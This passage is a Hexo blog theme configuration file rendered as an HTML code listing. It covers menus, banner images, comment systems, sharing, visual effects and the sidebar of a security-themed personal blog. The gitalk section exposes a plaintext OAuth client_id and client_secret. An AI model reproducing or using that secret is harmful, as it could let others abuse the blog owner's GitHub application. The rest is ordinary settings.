class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br></pre></td><td class="code"><pre><span class="line"># Main menu navigation (導航目錄)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># format: name: link || icon</span><br><span class="line"># sub-menu</span><br><span class="line"># name || icon:</span><br><span class="line">#   name || link || icon</span><br><span class="line"></span><br><span class="line">menu:</span><br><span class="line">   Home: &#x2F; || fas fa-home</span><br><span class="line">   Archives: &#x2F;archives&#x2F; || fas fa-archive</span><br><span class="line">  #Tags: &#x2F;tags&#x2F; || fas fa-tags</span><br><span class="line">  #Categories: &#x2F;categories&#x2F; || fas fa-folder-open</span><br><span class="line">  # List||fas fa-list:</span><br><span class="line">  #   - Music || &#x2F;music&#x2F; || fas fa-music</span><br><span class="line">  #   - Movie || &#x2F;movies&#x2F; || fas fa-video</span><br><span class="line">   Link: &#x2F;link&#x2F; || fas fa-link</span><br><span class="line">   About: &#x2F;about&#x2F; || fas fa-heart</span><br><span class="line"></span><br><span class="line"># Hide the child menu items in mobile sidebar</span><br><span class="line">hide_sidebar_menu_child: false</span><br><span class="line"></span><br><span class="line"># Code Blocks (代碼相關)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line">highlight_theme: mac #  darker &#x2F; pale night &#x2F; light &#x2F; ocean &#x2F; mac &#x2F; mac light &#x2F; false</span><br><span class="line">highlight_copy: true # copy button</span><br><span class="line">highlight_lang: true # show the code language</span><br><span class="line">highlight_shrink: false # true: shrink the code blocks &#x2F; false: expand the code blocks | none: expand code blocks and hide the button</span><br><span class="line">code_word_wrap: false</span><br><span class="line"></span><br><span class="line"># copy settings</span><br><span class="line"># copyright: Add the copyright information after copied content (複製的內容後面加上版權信息)</span><br><span class="line">copy:</span><br><span class="line">  enable: true</span><br><span class="line">  copyright:</span><br><span class="line">    enable: false</span><br><span class="line">    limit_count: 50</span><br><span class="line"></span><br><span class="line"># social settings (社交圖標設置)</span><br><span class="line"># formal:</span><br><span class="line">#   icon: link || the description</span><br><span class="line">social:</span><br><span class="line">  # fab fa-github: https:&#x2F;&#x2F;github.com&#x2F;xxxxx || Github</span><br><span class="line">  # fas fa-envelope: mailto:xxxxxx@gmail.com || Email</span><br><span class="line"></span><br><span class="line"># search (搜索)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Algolia search</span><br><span class="line">algolia_search:</span><br><span class="line">  enable: false</span><br><span class="line">  hits:</span><br><span class="line">    per_page: 6</span><br><span class="line"></span><br><span class="line"># Local search</span><br><span class="line">local_search:</span><br><span class="line">  enable: false</span><br><span class="line"></span><br><span class="line"># Math (數學)</span><br><span class="line"># --------------------------------------</span><br><span class="line"># About the per_page</span><br><span class="line"># if you set it to true, it will load mathjax&#x2F;katex script in each page (true 表示每一頁都加載js)</span><br><span class="line"># if you set it to false, it will load mathjax&#x2F;katex script according to your setting (add the &#39;mathjax: true&#39; in page&#39;s front-matter)</span><br><span class="line"># (false 需要時加載，須在使用的 Markdown Front-matter 加上 mathjax: true)</span><br><span class="line"></span><br><span class="line"># MathJax</span><br><span class="line">mathjax:</span><br><span class="line">  enable: false</span><br><span class="line">  per_page: false</span><br><span class="line"></span><br><span class="line"># KaTeX</span><br><span class="line">katex:</span><br><span class="line">  enable: false</span><br><span class="line">  per_page: false</span><br><span class="line">  hide_scrollbar: true</span><br><span class="line"></span><br><span class="line"># Image (圖片設置)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Favicon（網站圖標）</span><br><span class="line">favicon: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20201228205809.JPG</span><br><span class="line"></span><br><span class="line"># Avatar (頭像)</span><br><span class="line">avatar:</span><br><span class="line">  img: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20201228205809.JPG</span><br><span class="line">  effect: false</span><br><span class="line"></span><br><span class="line"># The banner image of home page</span><br><span class="line">index_img: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20201108134100.jpg</span><br><span class="line"># If the banner of page not setting, it will show the top_img</span><br><span class="line">default_top_img: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20201108134100.jpg</span><br><span class="line"></span><br><span class="line"># The banner image of archive page</span><br><span class="line">archive_img: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20200825211012.jpg</span><br><span class="line"></span><br><span class="line"># If the banner of tag page not setting, it will show the top_img</span><br><span class="line"># note: tag page, not tags page (子標籤頁面的 top_img)</span><br><span class="line">tag_img:</span><br><span class="line"></span><br><span class="line"># The banner image of tag page</span><br><span class="line"># format:</span><br><span class="line">#  - tag name: xxxxx</span><br><span class="line">tag_per_img:</span><br><span class="line"></span><br><span class="line"># If the banner of category page not setting, it will show the top_img</span><br><span class="line"># note: category page, not categories page (子分類頁面的 top_img)</span><br><span class="line">category_img:</span><br><span class="line"></span><br><span class="line"># The banner image of category page</span><br><span class="line"># format:</span><br><span class="line">#  - category name: xxxxx</span><br><span class="line">category_per_img:</span><br><span class="line"></span><br><span class="line">cover:</span><br><span class="line">  # display the cover or not (是否顯示文章封面)</span><br><span class="line">  index_enable: false</span><br><span class="line">  aside_enable: true</span><br><span class="line">  archives_enable: false</span><br><span class="line">  # the position of cover in home page (封面顯示的位置)</span><br><span class="line">  # left&#x2F;right&#x2F;both</span><br><span class="line">  position: left</span><br><span class="line">  # When cover is not set, the default cover is displayed (當沒有設置cover時，默認的封面顯示)</span><br><span class="line">  default_cover: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20200825210300.jpg</span><br><span class="line"></span><br><span class="line"># Replace Broken Images (替換無法顯示的圖片)</span><br><span class="line">error_img:</span><br><span class="line">  flink: &#x2F;img&#x2F;friend_404.gif</span><br><span class="line">  post_page: &#x2F;img&#x2F;404.jpg</span><br><span class="line"></span><br><span class="line"># A simple 404 page</span><br><span class="line">error_404:</span><br><span class="line">  enable: false</span><br><span class="line">  subtitle: &#39;Page Not Found&#39;</span><br><span class="line">  background: https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;05&#x2F;19&#x2F;aKOcLiyPl2JQdFD.png</span><br><span class="line"></span><br><span class="line">post_meta:</span><br><span class="line">  page: # Home Page</span><br><span class="line">    date_type: both # created or updated or both 主頁文章日期是創建日或者更新日或都顯示</span><br><span class="line">    date_format: date # date&#x2F;relative 顯示日期還是相對日期</span><br><span class="line">    categories: true # true or false 主頁是否顯示分類</span><br><span class="line">    tags: false # true or false 主頁是否顯示標籤</span><br><span class="line">    label: true # true or false 顯示描述性文字</span><br><span class="line">  post:</span><br><span class="line">    date_type: both # created or updated or both 文章頁日期是創建日或者更新日或都顯示</span><br><span class="line">    date_format: date # date&#x2F;relative 顯示日期還是相對日期</span><br><span class="line">    categories: true # true or false 文章頁是否顯示分類</span><br><span class="line">    tags: true # true or false 文章頁是否顯示標籤</span><br><span class="line">    label: true # true or false 顯示描述性文字</span><br><span class="line"></span><br><span class="line"># wordcount (字數統計)</span><br><span class="line">wordcount:</span><br><span class="line">  enable: false</span><br><span class="line">  post_wordcount: true</span><br><span class="line">  min2read: true</span><br><span class="line">  total_wordcount: true</span><br><span class="line"></span><br><span class="line"># Display the article introduction on homepage</span><br><span class="line"># 1: description</span><br><span class="line"># 2: both (if the description exists, it will show description, or show the auto_excerpt)</span><br><span class="line"># 3: auto_excerpt (default)</span><br><span class="line"># false: do not show the article introduction</span><br><span class="line">index_post_content:</span><br><span class="line">  method: 2</span><br><span class="line">  length: 200 # if you set method to 2 or 3, the length need to config</span><br><span class="line"></span><br><span class="line"># Post</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># toc (目錄)</span><br><span class="line">toc:</span><br><span class="line">  enable: true</span><br><span class="line">  number: true</span><br><span class="line"></span><br><span class="line">post_copyright:</span><br><span class="line">  enable: true</span><br><span class="line">  decode: false</span><br><span class="line">  license: CC BY-NC-SA 4.0</span><br><span class="line">  license_url: https:&#x2F;&#x2F;creativecommons.org&#x2F;licenses&#x2F;by-nc-sa&#x2F;4.0&#x2F;</span><br><span class="line"></span><br><span class="line"># Sponsor&#x2F;reward</span><br><span class="line">reward:</span><br><span class="line">  enable: false</span><br><span class="line">  QR_code:</span><br><span class="line">    # - img: &#x2F;img&#x2F;wechat.jpg</span><br><span class="line">    #   link:</span><br><span class="line">    #   text: wechat</span><br><span class="line">    # - img: &#x2F;img&#x2F;alipay.jpg</span><br><span class="line">    #   link:</span><br><span class="line">    #   text: alipay</span><br><span class="line"></span><br><span class="line"># Related Articles</span><br><span class="line">related_post:</span><br><span class="line">  enable: true</span><br><span class="line">  limit: 6 # Number of posts displayed</span><br><span class="line">  date_type: created # or created or updated 文章日期顯示創建日或者更新日</span><br><span class="line"></span><br><span class="line"># figcaption (圖片描述文字)</span><br><span class="line">photofigcaption: false</span><br><span class="line"></span><br><span class="line"># anchor</span><br><span class="line"># when you scroll in post, the URL will update according to header id.</span><br><span class="line">anchor: false</span><br><span class="line"></span><br><span class="line"># Displays outdated notice for a post (文章過期提醒)</span><br><span class="line">noticeOutdate:</span><br><span class="line">  enable: false</span><br><span class="line">  style: flat # style: simple&#x2F;flat</span><br><span class="line">  limit_day: 500 # When will it be shown</span><br><span class="line">  position: top # position: top&#x2F;bottom</span><br><span class="line">  message_prev: It has been</span><br><span class="line">  message_next: days since the last update, the content of the article may be outdated.</span><br><span class="line"></span><br><span class="line"># Share System (分享功能)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># AddThis</span><br><span class="line"># https:&#x2F;&#x2F;www.addthis.com&#x2F;</span><br><span class="line">addThis:</span><br><span class="line">  enable: false</span><br><span class="line">  pubid:</span><br><span class="line"></span><br><span class="line"># Share.js</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;overtrue&#x2F;share.js</span><br><span class="line">sharejs:</span><br><span class="line">  enable: true</span><br><span class="line">  sites: facebook,twitter,wechat,weibo,qq</span><br><span class="line"></span><br><span class="line"># AddToAny</span><br><span class="line"># https:&#x2F;&#x2F;www.addtoany.com&#x2F;</span><br><span class="line">addtoany:</span><br><span class="line">  enable: false</span><br><span class="line">  item: facebook,twitter,wechat,sina_weibo,facebook_messenger,email,copy_link</span><br><span class="line"></span><br><span class="line"># Comments System</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line">comments:</span><br><span class="line">  # Up to two comments system, the first will be shown as default</span><br><span class="line">  # Choose: Disqus&#x2F;Disqusjs&#x2F;Livere&#x2F;Gitalk&#x2F;Valine&#x2F;Utterances&#x2F;Facebook Comments</span><br><span class="line">  use:</span><br><span class="line">  # - Valine</span><br><span class="line">  # - Disqus</span><br><span class="line">  text: true # Display the comment name next to the button</span><br><span class="line">  # lazyload: The comment system will be load when comment element enters the browser&#39;s viewport.</span><br><span class="line">  # If you set it to true, the comment count will be invalid</span><br><span class="line">  lazyload: false</span><br><span class="line">  count: false # Display comment count in top_img</span><br><span class="line"></span><br><span class="line"># disqus</span><br><span class="line"># https:&#x2F;&#x2F;disqus.com&#x2F;</span><br><span class="line">disqus:</span><br><span class="line">  shortname:</span><br><span class="line"></span><br><span class="line"># Alternative Disqus - Render comments with Disqus API</span><br><span class="line"># DisqusJS 評論系統，可以實現在網路審查地區載入 Disqus 評論列表，兼容原版</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;SukkaW&#x2F;DisqusJS</span><br><span class="line">disqusjs:</span><br><span class="line">  shortname:</span><br><span class="line">  siteName:</span><br><span class="line">  apikey:</span><br><span class="line">  api:</span><br><span class="line">  nocomment: # display when a blog post or an article has no comment attached</span><br><span class="line">  admin:</span><br><span class="line">  adminLabel:</span><br><span class="line"></span><br><span class="line"># livere (來必力)</span><br><span class="line"># https:&#x2F;&#x2F;www.livere.com&#x2F;</span><br><span class="line">livere:</span><br><span class="line">  uid:</span><br><span class="line"></span><br><span class="line"># gitalk</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;gitalk&#x2F;gitalk</span><br><span class="line">gitalk:</span><br><span class="line">  client_id: 6ceed9c245da8d33222a</span><br><span class="line">  client_secret: 143c0add0301972b963c8f672bf4e58a092673fb</span><br><span class="line">  repo: Gitalk</span><br><span class="line">  owner: ifonly-go2019</span><br><span class="line">  admin: ifonly-go2019</span><br><span class="line">  language: zh-CN # en, zh-CN, zh-TW, es-ES, fr, ru</span><br><span class="line">  perPage: 10 # Pagination size, with maximum 100.</span><br><span class="line">  distractionFreeMode: false # Facebook-like distraction free mode.</span><br><span class="line">  pagerDirection: last # Comment sorting direction, available values are last and first.</span><br><span class="line">  createIssueManually: false # Gitalk will create a corresponding github issue for your every single page automatically</span><br><span class="line"></span><br><span class="line"># valine</span><br><span class="line"># https:&#x2F;&#x2F;valine.js.org</span><br><span class="line">valine:</span><br><span class="line">  appId: # leancloud application app id</span><br><span class="line">  appKey: # leancloud application app key</span><br><span class="line">  pageSize: 10 # comment list page size</span><br><span class="line">  avatar: monsterid # gravatar style https:&#x2F;&#x2F;valine.js.org&#x2F;#&#x2F;avatar</span><br><span class="line">  lang: en # i18n: zh-CN&#x2F;zh-TW&#x2F;en&#x2F;ja</span><br><span class="line">  placeholder: Please leave your footprints # valine comment input placeholder (like: Please leave your footprints)</span><br><span class="line">  guest_info: nick,mail,link # valine comment header info (nick&#x2F;mail&#x2F;link)</span><br><span class="line">  recordIP: false # Record reviewer IP</span><br><span class="line">  serverURLs: # This configuration is suitable for domestic custom domain name users, overseas version will be automatically detected (no need to manually fill in)</span><br><span class="line">  bg: # valine background</span><br><span class="line">  emojiCDN: # emoji CDN</span><br><span class="line">  enableQQ: false # enable the Nickname box to automatically get QQ Nickname and QQ Avatar</span><br><span class="line">  requiredFields: nick,mail # required fields (nick&#x2F;mail)</span><br><span class="line">  option:</span><br><span class="line"></span><br><span class="line"># utterances</span><br><span class="line"># https:&#x2F;&#x2F;utteranc.es&#x2F;</span><br><span class="line">utterances:</span><br><span class="line">  repo:</span><br><span class="line">  # Issue Mapping: pathname&#x2F;url&#x2F;title&#x2F;og:title</span><br><span class="line">  issue_term: pathname</span><br><span class="line">  # Theme: github-light&#x2F;github-dark&#x2F;github-dark-orange&#x2F;icy-dark&#x2F;dark-blue&#x2F;photon-dark</span><br><span class="line">  light_theme: github-light</span><br><span class="line">  dark_theme: photon-dark</span><br><span class="line"></span><br><span class="line"># Facebook Comments Plugin</span><br><span class="line"># https:&#x2F;&#x2F;developers.facebook.com&#x2F;docs&#x2F;plugins&#x2F;comments&#x2F;</span><br><span class="line">facebook_comments:</span><br><span class="line">  app_id:</span><br><span class="line">  user_id: # optional</span><br><span class="line">  pageSize: 10 # The number of comments to show</span><br><span class="line">  order_by: social # social&#x2F;time&#x2F;reverse_time</span><br><span class="line">  lang: en_US # Language en_US&#x2F;zh_CN&#x2F;zh_TW and so on</span><br><span class="line"></span><br><span class="line"># Twikoo</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;imaegoo&#x2F;twikoo</span><br><span class="line">twikoo:</span><br><span class="line"></span><br><span class="line"># Chat Services</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Chat Button [recommend]</span><br><span class="line"># It will create a button in the bottom right corner of website, and hide the origin button</span><br><span class="line">chat_btn: false</span><br><span class="line"></span><br><span class="line"># The origin chat button is displayed when scrolling up, and the button is hidden when scrolling down</span><br><span class="line">chat_hide_show: false</span><br><span class="line"></span><br><span class="line"># chatra</span><br><span class="line"># https:&#x2F;&#x2F;chatra.io&#x2F;</span><br><span class="line">chatra:</span><br><span class="line">  enable: false</span><br><span class="line">  id:</span><br><span class="line"></span><br><span class="line"># tidio</span><br><span class="line"># https:&#x2F;&#x2F;www.tidio.com&#x2F;</span><br><span class="line">tidio:</span><br><span class="line">  enable: false</span><br><span class="line">  public_key:</span><br><span class="line"></span><br><span class="line"># daovoice</span><br><span class="line"># http:&#x2F;&#x2F;daovoice.io&#x2F;</span><br><span class="line">daovoice:</span><br><span class="line">  enable: false</span><br><span class="line">  app_id:</span><br><span class="line"></span><br><span class="line"># gitter</span><br><span class="line"># https:&#x2F;&#x2F;gitter.im&#x2F;</span><br><span class="line">gitter:</span><br><span class="line">  enable: false</span><br><span class="line">  room:</span><br><span class="line"></span><br><span class="line"># crisp</span><br><span class="line"># https:&#x2F;&#x2F;crisp.chat&#x2F;en&#x2F;</span><br><span class="line">crisp:</span><br><span class="line">  enable: false</span><br><span class="line">  website_id:</span><br><span class="line"></span><br><span class="line"># Footer Settings</span><br><span class="line"># --------------------------------------</span><br><span class="line">footer:</span><br><span class="line">  owner:</span><br><span class="line">    enable: true</span><br><span class="line">    since: 2019</span><br><span class="line">  custom_text:</span><br><span class="line">  copyright: true # Copyright of theme and framework</span><br><span class="line">  ICP: # Chinese ICP License</span><br><span class="line">    enable: false</span><br><span class="line">    url:</span><br><span class="line">    text:</span><br><span class="line">    icon: &#x2F;img&#x2F;icp.png</span><br><span class="line"></span><br><span class="line"># Analysis</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Baidu Analytics</span><br><span class="line"># https:&#x2F;&#x2F;tongji.baidu.com&#x2F;web&#x2F;welcome&#x2F;login</span><br><span class="line">baidu_analytics:</span><br><span class="line"></span><br><span class="line"># Google Analytics</span><br><span class="line"># https:&#x2F;&#x2F;analytics.google.com&#x2F;analytics&#x2F;web&#x2F;</span><br><span class="line">google_analytics:</span><br><span class="line"></span><br><span class="line"># Tencent Analytics ID</span><br><span class="line"># https:&#x2F;&#x2F;mta.qq.com</span><br><span class="line">tencent_analytics:</span><br><span class="line"></span><br><span class="line"># CNZZ Analytics</span><br><span class="line"># https:&#x2F;&#x2F;www.umeng.com&#x2F;</span><br><span class="line">cnzz_analytics:</span><br><span class="line"></span><br><span class="line"># Advertisement</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Google Adsense (谷歌廣告)</span><br><span class="line">google_adsense:</span><br><span class="line">  enable: false</span><br><span class="line">  auto_ads: true</span><br><span class="line">  js: https:&#x2F;&#x2F;pagead2.googlesyndication.com&#x2F;pagead&#x2F;js&#x2F;adsbygoogle.js</span><br><span class="line">  client:</span><br><span class="line">  enable_page_level_ads: true</span><br><span class="line"></span><br><span class="line"># Insert ads manually (手動插入廣告)</span><br><span class="line"># ad:</span><br><span class="line">#   index:</span><br><span class="line">#   aside:</span><br><span class="line">#   post:</span><br><span class="line"></span><br><span class="line"># Verification (站長驗證)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Google Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;www.google.com&#x2F;webmasters&#x2F;</span><br><span class="line">google_site_verification:</span><br><span class="line"></span><br><span class="line"># Bing Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;www.bing.com&#x2F;webmaster&#x2F;</span><br><span class="line">bing_site_verification:</span><br><span class="line"></span><br><span class="line"># Baidu Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;ziyuan.baidu.com&#x2F;site&#x2F;</span><br><span class="line">baidu_site_verification:</span><br><span class="line"></span><br><span class="line"># 360 Webmaster tools verification setting</span><br><span class="line"># see http:&#x2F;&#x2F;zhanzhang.so.com&#x2F;</span><br><span class="line">qihu_site_verification:</span><br><span class="line"></span><br><span class="line"># Yandex Webmaster tools verification setting</span><br><span class="line"># see https:&#x2F;&#x2F;webmaster.yandex.com&#x2F;</span><br><span class="line">yandex_site_verification:</span><br><span class="line"></span><br><span class="line"># Beautify&#x2F;Effect (美化&#x2F;效果)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Theme color for customize</span><br><span class="line"># Notice: color value must in double quotes like &quot;#000&quot; or may cause error!</span><br><span class="line"></span><br><span class="line"># theme_color:</span><br><span class="line">#   enable: true</span><br><span class="line">#   main: &quot;#49B1F5&quot;</span><br><span class="line">#   paginator: &quot;#00c4b6&quot;</span><br><span class="line">#   button_hover: &quot;#FF7242&quot;</span><br><span class="line">#   text_selection: &quot;#00c4b6&quot;</span><br><span class="line">#   link_color: &quot;#99a9bf&quot;</span><br><span class="line">#   meta_color: &quot;#858585&quot;</span><br><span class="line">#   hr_color: &quot;#A4D8FA&quot;</span><br><span class="line">#   code_foreground: &quot;#F47466&quot;</span><br><span class="line">#   code_background: &quot;rgba(27, 31, 35, .05)&quot;</span><br><span class="line">#   toc_color: &quot;#00c4b6&quot;</span><br><span class="line">#   blockquote_padding_color: &quot;#49b1f5&quot;</span><br><span class="line">#   blockquote_background_color: &quot;#49b1f5&quot;</span><br><span class="line"></span><br><span class="line"># The top_img settings of home page</span><br><span class="line"># default: top img - full screen, site info - middle (默認top_img全屏，site_info在中間)</span><br><span class="line"># The position of site info, eg: 300px&#x2F;300em&#x2F;300rem&#x2F;10% (主頁標題距離頂部距離)</span><br><span class="line">index_site_info_top:</span><br><span class="line"># The height of top_img, eg: 300px&#x2F;300em&#x2F;300rem (主頁top_img高度)</span><br><span class="line">index_top_img_height:</span><br><span class="line"></span><br><span class="line"># The user interface setting of category and tag page (category和tag頁的UI設置)</span><br><span class="line"># index - same as Homepage UI (index 值代表 UI將與首頁的UI一樣)</span><br><span class="line"># default - same as archives UI 默認跟archives頁面UI一樣</span><br><span class="line">category_ui: # 留空或 index</span><br><span class="line">tag_ui: # 留空或 index</span><br><span class="line"></span><br><span class="line"># Website Background (設置網站背景)</span><br><span class="line"># can set it to color or image (可設置圖片 或者 顔色)</span><br><span class="line"># The formal of image: url(http:&#x2F;&#x2F;xxxxxx.com&#x2F;xxx.jpg)</span><br><span class="line">background: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20200825211012.jpg</span><br><span class="line"></span><br><span class="line"># Footer Background</span><br><span class="line">footer_bg: false</span><br><span class="line"></span><br><span class="line"># the position of bottom right button&#x2F;default unit: px (右下角按鈕距離底部的距離&#x2F;默認單位為px)</span><br><span class="line">rightside-bottom:</span><br><span class="line"></span><br><span class="line"># Enter transitions (開啓網頁進入效果)</span><br><span class="line">enter_transitions: true</span><br><span class="line"></span><br><span class="line"># Background effects (背景特效)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># canvas_ribbon (靜止彩帶背景)</span><br><span class="line"># See: https:&#x2F;&#x2F;github.com&#x2F;hustcc&#x2F;ribbon.js</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: false</span><br><span class="line">  size: 150</span><br><span class="line">  alpha: 0.6</span><br><span class="line">  zIndex: -1</span><br><span class="line">  click_to_change: false</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Fluttering Ribbon (動態彩帶)</span><br><span class="line">canvas_fluttering_ribbon:</span><br><span class="line">  enable: false</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># canvas_nest</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;hustcc&#x2F;canvas-nest.js</span><br><span class="line">canvas_nest:</span><br><span class="line">  enable: false</span><br><span class="line">  color: &#39;0,0,255&#39; #color of lines, default: &#39;0,0,0&#39;; RGB values: (R,G,B).(note: use &#39;,&#39; to separate.)</span><br><span class="line">  opacity: 0.7 # the opacity of line (0~1), default: 0.5.</span><br><span class="line">  zIndex: -1 # z-index property of the background, default: -1.</span><br><span class="line">  count: 99 # the number of lines, default: 99.</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Typewriter Effect (打字效果)</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;disjukr&#x2F;activate-power-mode</span><br><span class="line">activate_power_mode:</span><br><span class="line">  enable: false</span><br><span class="line">  colorful: true # open particle animation (冒光特效)</span><br><span class="line">  shake: true #  open shake (抖動特效)</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Mouse click effects: fireworks (鼠標點擊效果: 煙火特效)</span><br><span class="line">fireworks:</span><br><span class="line">  enable: true</span><br><span class="line">  zIndex: 9999 # -1 or 9999</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Mouse click effects: Heart symbol (鼠標點擊效果: 愛心)</span><br><span class="line">click_heart:</span><br><span class="line">  enable: false</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Mouse click effects: words (鼠標點擊效果: 文字)</span><br><span class="line">ClickShowText:</span><br><span class="line">  enable: false</span><br><span class="line">  text:</span><br><span class="line">    # - I</span><br><span class="line">    # - LOVE</span><br><span class="line">    # - YOU</span><br><span class="line">  fontSize: 15px</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Default display mode (網站默認的顯示模式)</span><br><span class="line"># light (default) &#x2F; dark</span><br><span class="line">display_mode: light</span><br><span class="line"></span><br><span class="line"># Beautify (美化頁面顯示)</span><br><span class="line">beautify:</span><br><span class="line">  enable: false</span><br><span class="line">  field: post # site&#x2F;post</span><br><span class="line">  title-prefix-icon: &#39;\f0c1&#39;</span><br><span class="line">  title-prefix-icon-color: &#39;#F47466&#39;</span><br><span class="line"></span><br><span class="line"># Global font settings</span><br><span class="line"># Don&#39;t modify the following settings unless you know how they work (非必要不要修改)</span><br><span class="line">font:</span><br><span class="line">  global-font-size:</span><br><span class="line">  code-font-size:</span><br><span class="line">  font-family:</span><br><span class="line">  code-font-family:</span><br><span class="line"></span><br><span class="line"># Font settings for the site title and site subtitle</span><br><span class="line"># 左上角網站名字 主頁居中網站名字</span><br><span class="line">blog_title_font:</span><br><span class="line">  font_link:</span><br><span class="line">  font-family:</span><br><span class="line"></span><br><span class="line"># The setting of divider icon (水平分隔線圖標設置)</span><br><span class="line">hr_icon:</span><br><span class="line">  enable: true</span><br><span class="line">  icon: # the unicode value of Font Awesome icon, such as &#39;\3423&#39;</span><br><span class="line">  icon-top:</span><br><span class="line"></span><br><span class="line"># the subtitle on homepage (主頁subtitle)</span><br><span class="line">subtitle:</span><br><span class="line">  enable: true</span><br><span class="line">  # Typewriter Effect (打字效果)</span><br><span class="line">  effect: true</span><br><span class="line">  # loop (循環打字)</span><br><span class="line">  loop: true</span><br><span class="line">  # source調用第三方服務</span><br><span class="line">  # source: false 關閉調用</span><br><span class="line">  # source: 1  調用搏天api的隨機語錄（簡體） https:&#x2F;&#x2F;api.btstu.cn&#x2F;</span><br><span class="line">  # source: 2  調用一言網的一句話（簡體） https:&#x2F;&#x2F;hitokoto.cn&#x2F;</span><br><span class="line">  # source: 3  調用一句網（簡體） http:&#x2F;&#x2F;yijuzhan.com&#x2F;</span><br><span class="line">  # source: 4  調用今日詩詞（簡體） https:&#x2F;&#x2F;www.jinrishici.com&#x2F;</span><br><span class="line">  # subtitle 會先顯示 source , 再顯示 sub 的內容</span><br><span class="line">  source: false</span><br><span class="line">  # 如果有英文逗號&#39; , &#39;,請使用轉義字元 &amp;#44;</span><br><span class="line">  # 如果有英文雙引號&#39; &quot; &#39;,請使用轉義字元 &quot;</span><br><span class="line">  # 開頭不允許轉義字元，如需要，請把整個句子用雙引號包住</span><br><span class="line">  # 如果關閉打字效果，subtitle只會顯示sub的第一行文字</span><br><span class="line">  sub: 作为一名合格的攻防人员,工具的熟练掌握仅仅只是极小的一部分,对各种利用原理的深度理解和二次定制能力才是你的核心</span><br><span class="line"></span><br><span class="line"># Loading Animation (加載動畫)</span><br><span class="line">preloader: false</span><br><span class="line"></span><br><span class="line"># aside (側邊欄)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line">aside:</span><br><span class="line">  enable: true</span><br><span class="line">  hide: false</span><br><span class="line">  button: true</span><br><span class="line">  mobile: true # display on mobile</span><br><span class="line">  position: right # left or right</span><br><span class="line">  card_author:</span><br><span class="line">    enable: true</span><br><span class="line">    description:</span><br><span class="line">    button:</span><br><span class="line">      icon: fab fa-github</span><br><span class="line">      text: Follow Me</span><br><span class="line">      link: https:&#x2F;&#x2F;github.com&#x2F;ifonly-go2019</span><br><span class="line">  card_announcement:</span><br><span class="line">    enable: true</span><br><span class="line">    content: Hack for fun，live for LOVE.</span><br><span class="line">  card_recent_post:</span><br><span class="line">    enable: false</span><br><span class="line">    limit: 5 # if set 0 will show all</span><br><span class="line">    sort: date # date or updated</span><br><span class="line">  card_categories:</span><br><span class="line">    enable: true</span><br><span class="line">    limit: 8 # if set 0 will show all</span><br><span class="line">    expand: none # none&#x2F;true&#x2F;false</span><br><span class="line">  card_tags:</span><br><span class="line">    enable: true</span><br><span class="line">    limit: 40 # if set 0 will show all</span><br><span class="line">    color: false</span><br><span class="line">  card_archives:</span><br><span class="line">    enable: 